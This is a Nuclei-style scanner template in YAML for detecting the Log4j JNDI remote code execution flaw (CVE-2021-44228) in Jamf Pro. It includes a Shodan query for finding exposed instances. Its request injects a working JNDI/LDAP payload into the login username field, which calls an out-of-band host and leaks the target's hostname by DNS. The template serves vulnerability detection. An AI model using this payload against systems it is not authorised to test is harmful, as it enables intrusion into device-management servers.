id: jamf-pro-log4j-rce
info:
  name: JamF Pro - Remote Code Execution (Apache Log4j)
  author: DhiyaneshDK,pdteam
  severity: critical
  description: Jamf Pro, the industry standard for device management, is vulnerable
    to Log4j JNDI remote code execution, allowing attackers to gain control over iOS,
    macOS, and tvOS devices.
  reference:
  - https://github.com/random-robbie/jamf-log4j
  - https://docs.jamf.com/technical-articles/Mitigating_the_Apache_Log4j_2_Vulnerability.html
  - https://community.connection.com/what-is-jamf/
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: title:"Jamf Pro"
    verified: 'true'
    impact: The impact of JamF's susceptibility to Log4j JNDI remote code execution
      is significant as it compromises the security of a widely used device management
      system for iOS, macOS, and tvOS devices.
    recommendation: I recommend JamF users to immediately update their software to
      avoid the jamf-pro-log4j-rce vulnerability and ensure secure management of their
      iOS, macOS, and tvOS devices.
  tags: cve,cve2021,rce,jndi,log4j,jamf,oast,kev
requests:
- raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Referer: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded


    username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&password=

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  - type: word
    part: body
    words:
    - <title>Jamf Pro Login</title>
  extractors:
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
